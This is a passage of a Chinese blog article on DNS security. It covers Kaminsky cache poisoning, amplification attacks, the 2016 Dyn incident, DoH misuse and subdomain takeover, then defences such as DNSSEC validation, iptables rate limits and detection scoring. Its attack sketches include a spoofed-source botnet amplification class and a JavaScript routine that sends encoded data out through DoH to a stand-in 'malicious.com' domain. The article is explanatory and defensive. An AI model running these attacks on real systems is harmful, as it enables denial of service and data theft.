<h3 data-id="heading-11"><strong>2.3 Kaminsky漏洞：改变游戏规则</strong></h3>
<p><strong>2008年发现</strong>，允许攻击者在秒级时间内污染DNS缓存：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">kaminsky_exploit</span>(<span class="hljs-params">target_dns, domain</span>):
    <span class="hljs-comment"># 1. 查询目标域名的子域名（每次不同）</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
        subdomain = <span class="hljs-string">f"<span class="hljs-subst">{random_string(<span class="hljs-number">10</span>)}</span>.<span class="hljs-subst">{domain}</span>"</span>
        
        <span class="hljs-comment"># 2. 触发目标DNS向上游查询</span>
        send_query(target_dns, subdomain)
        
        <span class="hljs-comment"># 3. 发送大量伪造响应，尝试预测Transaction ID</span>
        <span class="hljs-keyword">for</span> txid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):
            send_spoofed_response(
                target_dns,
                subdomain,
                malicious_ip,
                txid
            )
        
        <span class="hljs-comment"># 4. 如果成功，整个域的缓存都被污染</span>
        <span class="hljs-keyword">if</span> check_poisoned(target_dns, domain):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h2 data-id="heading-12"><strong>三、DNS放大攻击：小问题引发大灾难</strong></h2>
<h3 data-id="heading-13"><strong>3.1 放大效应的数学原理</strong></h3>
<pre><code class="hljs language-scss" lang="scss">基本公式：放大倍数 = 响应大小 / 查询大小

查询例子：example<span class="hljs-selector-class">.com</span> ANY (<span class="hljs-number">60</span>字节)
响应例子：包含所有记录类型 (<span class="hljs-number">4000</span>字节)
放大倍数：<span class="hljs-number">4000</span> ÷ <span class="hljs-number">60</span> ≈ <span class="hljs-number">67</span>倍
</code></pre>
<p><strong>不同类型记录的放大效果</strong>：</p>









































<table><thead><tr><th>记录类型</th><th>查询大小</th><th>典型响应</th><th>放大倍数</th></tr></thead><tbody><tr><td>A记录</td><td>60字节</td><td>100字节</td><td>1.7倍</td></tr><tr><td>MX记录</td><td>60字节</td><td>500字节</td><td>8.3倍</td></tr><tr><td>TXT记录</td><td>60字节</td><td>3000字节</td><td>50倍</td></tr><tr><td>ANY记录</td><td>60字节</td><td>4000字节</td><td>67倍</td></tr><tr><td>DNSSEC</td><td>60字节</td><td>4000+字节</td><td>70+倍</td></tr></tbody></table>
<h3 data-id="heading-14"><strong>3.2 僵尸网络的规模化攻击</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DDoSBotnet</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, bot_count=<span class="hljs-number">10000</span></span>):
        self.bots = self.load_bots(bot_count)
        self.open_dns_servers = self.scan_open_resolvers()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">launch_amplification_attack</span>(<span class="hljs-params">self, victim_ip</span>):
        <span class="hljs-comment"># 每个僵尸执行</span>
        <span class="hljs-keyword">for</span> bot <span class="hljs-keyword">in</span> self.bots:
            <span class="hljs-comment"># 选择放大倍数最高的记录类型</span>
            record_type = self.select_optimal_record()
            
            <span class="hljs-comment"># 构造伪造请求</span>
            query = DNS(
                <span class="hljs-built_in">id</span>=random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">65535</span>),
                qd=DNSQR(qname=self.target_domain, qtype=record_type)
            )
            
            <span class="hljs-comment"># 发送到多个开放DNS服务器</span>
            <span class="hljs-keyword">for</span> dns_server <span class="hljs-keyword">in</span> self.open_dns_servers[:<span class="hljs-number">10</span>]:
                spoofed_packet = IP(
                    src=victim_ip,  <span class="hljs-comment"># 伪造源地址</span>
                    dst=dns_server
                )/UDP(sport=random_port(), dport=<span class="hljs-number">53</span>)/query
                
                bot.send(spoofed_packet)
        
        <span class="hljs-comment"># 计算总攻击流量</span>
        total_traffic = self.calculate_amplification()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"理论最大流量：<span class="hljs-subst">{total_traffic/<span class="hljs-number">1e9</span>:<span class="hljs-number">.2</span>f}</span> Gbps"</span>)
</code></pre>
<h3 data-id="heading-15"><strong>3.3 史上最大攻击：Dyn DNS事件分析</strong></h3>
<p><strong>2016年10月21日</strong>，针对Dyn DNS服务的攻击：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">攻击参数:</span>
  <span class="hljs-string">峰值流量:</span> <span class="hljs-number">1.2</span> <span class="hljs-string">Tbps</span>
  <span class="hljs-string">持续时间:</span> <span class="hljs-string">持续多波，每波约1小时</span>
  <span class="hljs-string">攻击源:</span> <span class="hljs-number">10</span><span class="hljs-number">-100</span><span class="hljs-string">万台IoT设备组成的Mirai僵尸网络</span>
  <span class="hljs-string">放大载体:</span> <span class="hljs-string">开放DNS递归服务器</span> <span class="hljs-string">+</span> <span class="hljs-string">NTP放大</span>
  <span class="hljs-string">受影响服务:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">Twitter:</span> <span class="hljs-string">全球中断2小时</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">GitHub:</span> <span class="hljs-string">服务严重降级</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">Netflix:</span> <span class="hljs-string">美国东海岸用户无法访问</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">纽约时报、华尔街日报等:</span> <span class="hljs-string">访问困难</span>
  
<span class="hljs-string">技术细节:</span>
  <span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">攻击组合:</span> <span class="hljs-string">DNS放大</span> <span class="hljs-string">+</span> <span class="hljs-string">NTP放大</span> <span class="hljs-string">+</span> <span class="hljs-string">SYN</span> <span class="hljs-string">Flood</span>
  <span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">查询类型:</span> <span class="hljs-string">主要使用ANY和TXT记录</span>
  <span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">伪造技术:</span> <span class="hljs-string">源地址随机化，难以追踪</span>
  <span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">躲避策略:</span> <span class="hljs-string">动态更换攻击目标和服务</span>
</code></pre>
<h2 data-id="heading-16"><strong>四、现代DNS威胁演进</strong></h2>
<h3 data-id="heading-17"><strong>4.1 DoH/DoT的新型威胁</strong></h3>
<p><strong>DNS over HTTPS (DoH) 的安全悖论</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// DoH虽然加密，但引入新问题</span>
<span class="hljs-keyword">const</span> dohThreats = {
    <span class="hljs-comment">// 1. 中心化风险</span>
    <span class="hljs-attr">centralization</span>: {
        <span class="hljs-attr">providers</span>: [<span class="hljs-string">'Cloudflare'</span>, <span class="hljs-string">'Google'</span>, <span class="hljs-string">'Quad9'</span>],
        <span class="hljs-attr">risk</span>: <span class="hljs-string">'单点故障，隐私集中'</span>
    },
    
    <span class="hljs-comment">// 2. 企业监控困难</span>
    <span class="hljs-attr">enterprise</span>: {
        <span class="hljs-attr">issue</span>: <span class="hljs-string">'绕过公司DNS策略'</span>,
        <span class="hljs-attr">example</span>: <span class="hljs-string">'恶意软件使用DoH外联C2服务器'</span>
    },
    
    <span class="hljs-comment">// 3. 协议识别问题</span>
    <span class="hljs-attr">detection</span>: {
        <span class="hljs-attr">challenge</span>: <span class="hljs-string">'DoH流量与普通HTTPS难以区分'</span>,
        <span class="hljs-attr">solution</span>: <span class="hljs-string">'深度包检测(DPI)'</span>
    }
};

<span class="hljs-comment">// 恶意软件利用DoH的示例</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MalwareWithDoH</span> {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">exfiltrateData</span>(<span class="hljs-params">data</span>) {
        <span class="hljs-comment">// 使用DoH隐藏DNS查询</span>
        <span class="hljs-keyword">const</span> dohUrl = <span class="hljs-string">'https://cloudflare-dns.com/dns-query'</span>;
        <span class="hljs-keyword">const</span> query = <span class="hljs-title function_">btoa</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
        
        <span class="hljs-comment">// 将数据编码在DNS查询中</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">${dohUrl}</span>?name=<span class="hljs-subst">${query}</span>.malicious.com`</span>);
        
        <span class="hljs-comment">// 攻击者DNS服务器解析查询，提取数据</span>
        <span class="hljs-keyword">return</span> response.<span class="hljs-property">ok</span>;
    }
}
</code></pre>
<h3 data-id="heading-18"><strong>4.2 子域名劫持攻击</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SubdomainTakeover</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_vulnerable_subdomains</span>(<span class="hljs-params">self, domain</span>):
        <span class="hljs-comment"># 1. 枚举所有子域名</span>
        subdomains = self.enumerate_subdomains(domain)
        
        vulnerable = []
        <span class="hljs-keyword">for</span> sub <span class="hljs-keyword">in</span> subdomains:
            <span class="hljs-comment"># 2. 检查DNS记录但无主机服务的情况</span>
            dns_record = self.resolve_dns(sub)
            
            <span class="hljs-keyword">if</span> dns_record <span class="hljs-keyword">and</span> self.check_service_status(sub) == <span class="hljs-string">'no_host'</span>:
                <span class="hljs-comment"># 3. 常见易受攻击服务</span>
                <span class="hljs-keyword">if</span> dns_record[<span class="hljs-string">'type'</span>] <span class="hljs-keyword">in</span> [<span class="hljs-string">'CNAME'</span>, <span class="hljs-string">'NS'</span>]:
                    target = dns_record[<span class="hljs-string">'value'</span>]
                    
                    <span class="hljs-comment"># 4. 检查是否可以接管</span>
                    <span class="hljs-keyword">if</span> self.can_takeover(target):
                        vulnerable.append({
                            <span class="hljs-string">'subdomain'</span>: sub,
                            <span class="hljs-string">'record_type'</span>: dns_record[<span class="hljs-string">'type'</span>],
                            <span class="hljs-string">'target'</span>: target,
                            <span class="hljs-string">'risk'</span>: self.assess_risk(sub)
                        })
        
        <span class="hljs-keyword">return</span> vulnerable

<span class="hljs-comment"># 攻击示例：接管Heroku应用</span>
<span class="hljs-comment"># 1. 公司配置：help.example.com CNAME -&gt; help.herokuapp.com</span>
<span class="hljs-comment"># 2. 公司删除了Heroku应用，但忘记删除DNS记录</span>
<span class="hljs-comment"># 3. 攻击者注册help.herokuapp.com</span>
<span class="hljs-comment"># 4. 所有访问help.example.com的用户到达攻击者页面</span>
</code></pre>
<h3 data-id="heading-19"><strong>4.3 量子计算对DNS安全的威胁</strong></h3>
<p><strong>未来的威胁</strong>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">QuantumDNSThreat</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">quantum_dns_attack</span>(<span class="hljs-params">self, encrypted_traffic</span>):
        <span class="hljs-comment"># 量子计算机可以破解当前加密算法</span>
        algorithms_vulnerable = {
            <span class="hljs-string">'RSA-2048'</span>: <span class="hljs-string">'易受Shor算法攻击'</span>,
            <span class="hljs-string">'ECC-256'</span>: <span class="hljs-string">'易受Shor算法攻击'</span>,
            <span class="hljs-string">'AES-256'</span>: <span class="hljs-string">'需Grover算法，但可增强密钥'</span>
        }
        
        <span class="hljs-comment"># 对DNSSEC的影响</span>
        dnssec_vulnerabilities = [
            <span class="hljs-string">'RSA签名可被伪造'</span>,
            <span class="hljs-string">'密钥交换可能被截获'</span>,
            <span class="hljs-string">'需要后量子密码学'</span>
        ]
        
        <span class="hljs-comment"># 防御策略</span>
        defenses = {
            <span class="hljs-string">'当前'</span>: <span class="hljs-string">'DNSSEC + TLS 1.3'</span>,
            <span class="hljs-string">'过渡'</span>: <span class="hljs-string">'混合加密（经典+量子安全）'</span>,
            <span class="hljs-string">'未来'</span>: <span class="hljs-string">'后量子密码学标准'</span>
        }
</code></pre>
<h2 data-id="heading-20"><strong>五、全面防御策略</strong></h2>
<h3 data-id="heading-21"><strong>5.1 多层次防御体系</strong></h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[用户层] --&gt; B{防御措施}
    B --&gt; C[使用DoH/DoT]
    B --&gt; D[定期检查Hosts文件]
    B --&gt; E[保持软件更新]
    
    F[应用层] --&gt; G{防御措施}
    G --&gt; H[实现DNSSEC验证]
    G --&gt; I[使用证书锁定]
    G --&gt; J[多CDN策略]
    
    K[网络层] --&gt; L{防御措施}
    L --&gt; M[部署BCP38]
    L --&gt; N[DNS防火墙]
    L --&gt; O[流量清洗中心]
    
    P[DNS运营者] --&gt; Q{防御措施}
    Q --&gt; R[关闭开放递归]
    Q --&gt; S[实施RRL]
    Q --&gt; T[DNSSEC部署]
</code></pre>
<h3 data-id="heading-22"><strong>5.2 技术实现代码</strong></h3>
<h4 data-id="heading-23"><strong>DNSSEC验证实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> dns.resolver
<span class="hljs-keyword">import</span> dns.dnssec
<span class="hljs-keyword">import</span> dns.rdatatype

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DNSSECValidator</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_with_dnssec</span>(<span class="hljs-params">self, domain</span>):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 1. 获取DNSKEY记录</span>
            dnskey_response = dns.resolver.resolve(domain, <span class="hljs-string">'DNSKEY'</span>)
            
            <span class="hljs-comment"># 2. 获取RRSIG记录</span>
            rrsig_response = dns.resolver.resolve(domain, <span class="hljs-string">'RRSIG'</span>)
            
            <span class="hljs-comment"># 3. 验证签名链</span>
            dns.dnssec.validate(
                dnskey_response.rrset,
                rrsig_response.rrset,
                {domain: dnskey_response.rrset}
            )
            
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✓ <span class="hljs-subst">{domain}</span> DNSSEC验证通过"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            
        <span class="hljs-keyword">except</span> dns.dnssec.ValidationFailure <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"✗ <span class="hljs-subst">{domain}</span> DNSSEC验证失败: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">except</span> dns.resolver.NoAnswer:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"? <span class="hljs-subst">{domain}</span> 未配置DNSSEC"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<h4 data-id="heading-24"><strong>DNS防火墙规则示例</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用iptables构建DNS防火墙</span>
<span class="hljs-comment">#!/bin/bash</span>

<span class="hljs-comment"># 1. 基础防护</span>
iptables -A INPUT -p udp --dport 53 -m state --state NEW -m recent \
  --<span class="hljs-built_in">set</span> --name dnsquery --rsource

<span class="hljs-comment"># 2. 限制查询频率</span>
iptables -A INPUT -p udp --dport 53 -m state --state NEW -m recent \
  --update --seconds 1 --hitcount 5 --name dnsquery --rsource -j DROP

<span class="hljs-comment"># 3. 阻止ANY查询攻击</span>
iptables -A INPUT -p udp --dport 53 -m string \
  --algo bm --hex-string <span class="hljs-string">"|00ff0001|"</span> -j DROP

<span class="hljs-comment"># 4. 响应速率限制（使用DNS服务器功能）</span>
<span class="hljs-comment"># BIND配置：</span>
<span class="hljs-comment"># rate-limit {</span>
<span class="hljs-comment">#   responses-per-second 10;</span>
<span class="hljs-comment">#   slip 2;</span>
<span class="hljs-comment">#   window 5;</span>
<span class="hljs-comment"># };</span>

<span class="hljs-comment"># 5. 监控和报警</span>
iptables -A INPUT -p udp --dport 53 -j LOG \
  --log-prefix <span class="hljs-string">"DNS-Query: "</span> --log-level 6
</code></pre>
<h3 data-id="heading-25"><strong>5.3 企业级防护架构</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EnterpriseDNSProtection</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.components = {
            <span class="hljs-string">'dns_firewall'</span>: DNSFirewall(),
            <span class="hljs-string">'traffic_analyzer'</span>: TrafficAnalyzer(),
            <span class="hljs-string">'threat_intel'</span>: ThreatIntelligence(),
            <span class="hljs-string">'automated_response'</span>: AutoResponder()
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">protect_network</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 1. 实时流量分析</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            packet = capture_packet()
            
            <span class="hljs-comment"># 2. DNS特定检测</span>
            <span class="hljs-keyword">if</span> packet.haslayer(DNS):
                threat_score = self.analyze_dns_packet(packet)
                
                <span class="hljs-comment"># 3. 威胁情报匹配</span>
                <span class="hljs-keyword">if</span> self.threat_intel.check_ioc(packet):
                    self.block_and_alert(packet)
                
                <span class="hljs-comment"># 4. 行为分析</span>
                <span class="hljs-keyword">elif</span> threat_score &gt; self.threshold:
                    self.rate_limit_or_block(packet)
                
                <span class="hljs-comment"># 5. 学习模式</span>
                <span class="hljs-keyword">else</span>:
                    self.update_baseline(packet)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_dns_packet</span>(<span class="hljs-params">self, packet</span>):
        score = <span class="hljs-number">0</span>
        
        <span class="hljs-comment"># 检测指标</span>
        indicators = {
            <span class="hljs-string">'query_length'</span>: <span class="hljs-built_in">len</span>(packet[DNS].qd.qname),
            <span class="hljs-string">'query_type'</span>: packet[DNS].qd.qtype,
            <span class="hljs-string">'response_size'</span>: <span class="hljs-built_in">len</span>(packet) <span class="hljs-keyword">if</span> packet[DNS].qr <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,
            <span class="hljs-string">'client_history'</span>: self.get_client_history(packet[IP].src),
            <span class="hljs-string">'domain_reputation'</span>: self.check_domain_reputation(packet[DNS].qd.qname)
        }
        
        <span class="hljs-comment"># 评分规则</span>
        <span class="hljs-keyword">if</span> indicators[<span class="hljs-string">'query_type'</span>] == <span class="hljs-number">255</span>:  <span class="hljs-comment"># ANY查询</span>
            score += <span class="hljs-number">20</span>
        
        <span class="hljs-keyword">if</span> indicators[<span class="hljs-string">'response_size'</span>] &gt; <span class="hljs-number">2000</span>:  <span class="hljs-comment"># 大响应</span>
            score += <span class="hljs-number">15</span>
        
        <span class="hljs-keyword">if</span> indicators[<span class="hljs-string">'domain_reputation'</span>] == <span class="hljs-string">'malicious'</span>:
            score += <span class="hljs-number">50</span>
        
        <span class="hljs-keyword">return</span> score
</code></pre>
<h3 data-id="heading-26"><strong>5.4 个人用户防护指南</strong></h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 个人DNS安全自查清单</span>

<span class="hljs-section">## 立即检查项目</span>
<span class="hljs-bullet">-</span> [ ] 路由器管理员密码是否已修改（不要使用admin/admin）
<span class="hljs-bullet">-</span> [ ] 路由器固件是否最新版本
<span class="hljs-bullet">-</span> [ ] 电脑Hosts文件是否被异常修改
<span class="hljs-bullet">-</span> [ ] 是否使用可靠的DNS服务器（如8.8.8.8, 1.1.1.1）

<span class="hljs-section">## 浏览器安全设置</span>
<span class="hljs-bullet">1.</span> Chrome/Firefox: 启用DoH
<span class="hljs-bullet">2.</span> 使用HTTPS Everywhere扩展
<span class="hljs-bullet">3.</span> 禁用不安全的插件

<span class="hljs-section">## 网络习惯</span>
<span class="hljs-bullet">-</span> 避免连接公共Wi-Fi进行敏感操作
<span class="hljs-bullet">-</span> 定期检查银行账户异常
<span class="hljs-bullet">-</span> 对异常重定向保持警惕

<span class="hljs-section">## 工具推荐</span>
<span class="hljs-bullet">-</span> DNSLeakTest.com: 检测DNS泄露
<span class="hljs-bullet">-</span> GRC DNS Benchmark: 测试DNS性能和安全
<span class="hljs-bullet">-</span> Wireshark: 高级用户网络分析
</code></pre>
<h2 data-id="heading-27"><strong>六、未来展望：DNS安全的演进</strong></h2>
<h3 data-id="heading-28"><strong>6.1 新技术标准</strong></h3>
<p><strong>正在发展的标准</strong>：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">1. DNS over QUIC (DoQ)
   - 结合QUIC协议的优点
   - 更好的连接迁移和丢包恢复

2. Oblivious DNS over HTTPS (ODoH)
   - 添加代理层，隐藏用户身份
   - 解决DoH的中心化隐私问题

3. 后量子DNS安全
   - NIST后量子密码学竞赛获胜者
   - 抗量子计算的DNSSEC
</code></pre>
<h3 data-id="heading-29"><strong>6.2 人工智能在DNS安全中的应用</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AIDNSDefender</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.model = self.train_ai_model()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ai_model</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 使用历史攻击数据训练</span>
        features = [
            <span class="hljs-string">'query_frequency'</span>,
            <span class="hljs-string">'response_amplification'</span>,
            <span class="hljs-string">'domain_entropy'</span>,
            <span class="hljs-string">'geographic_anomaly'</span>,
            <span class="hljs-string">'temporal_pattern'</span>
        ]
        
        <span class="hljs-comment"># 深度学习检测</span>
        model = Sequential([
            Dense(<span class="hljs-number">128</span>, activation=<span class="hljs-string">'relu'</span>, input_shape=(<span class="hljs-built_in">len</span>(features),)),
            Dropout(<span class="hljs-number">0.3</span>),
            Dense(<span class="hljs-number">64</span>, activation=<span class="hljs-string">'relu'</span>),
            Dense(<span class="hljs-number">32</span>, activation=<span class="hljs-string">'relu'</span>),
            Dense(<span class="hljs-number">1</span>, activation=<span class="hljs-string">'sigmoid'</span>)  <span class="hljs-comment"># 攻击概率</span>
        ])
        
        <span class="hljs-keyword">return</span> model
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">realtime_detection</span>(<span class="hljs-params">self, dns_traffic</span>):
        predictions = self.model.predict(dns_traffic)
        
        <span class="hljs-comment"># 自适应阈值</span>
        threshold = self.calculate_dynamic_threshold()
        
        attacks_detected = predictions &gt; threshold
        
        <span class="hljs-comment"># 自动化响应</span>
        <span class="hljs-keyword">for</span> i, is_attack <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(attacks_detected):
            <span class="hljs-keyword">if</span> is_attack:
                self.trigger_response(dns_traffic[i])
</code></pre>
<h2 data-id="heading-30"><strong>总结：构建深度防御体系</strong></h2>
<p>DNS安全不是单一技术能解决的问题，而是需要<strong>多层次、多维度的防御</strong>：</p>
<ol>
<li><strong>协议层</strong>：DNSSEC、DoH/DoT、响应速率限制</li>
<li><strong>网络层</strong>：BCP38、流量清洗、防火墙规则</li>
<li><strong>应用层</strong>：证书锁定、CSP策略、子域名监控</li>
<li><strong>用户层</strong>：安全意识、安全工具、良好习惯</li>
</ol>
<p><strong>记住</strong>：攻击者只需要找到<strong>一个漏洞</strong>，而防御者需要保护<strong>整个系统</strong>。DNS安全是一场持续的战斗，需要技术、策略和警惕性的结合。</p>
<p>随着新技术（如量子计算、5G、物联网）的发展，DNS攻击面只会越来越大。但只要我们持续学习、适应和创新，就能在这个不断变化的威胁环境中保持安全。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[面试官 : “ 说一下 localhost 和127.0.0.1 的区别 ? ”]]></title>    <link>https://juejin.cn/post/7589903499599413302</link>    <guid>https://juejin.cn/post/7589903499599413302</guid>    <pubDate>2026-01-01T09:01:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599413302" data-draft-id="7589916567875682346" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="面试官 : “ 说一下 localhost 和127.0.0.1 的区别 ? ”"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-01-01T09:01:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="千寻girling"/> <meta itemprop="url" content="https://juejin.cn/user/2276467567770442"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            面试官 : “ 说一下 localhost 和127.0.0.1 的区别 ? ”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2276467567770442/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    千寻girling
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T09:01:15.000Z" title="Thu Jan 01 2026 09:01:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 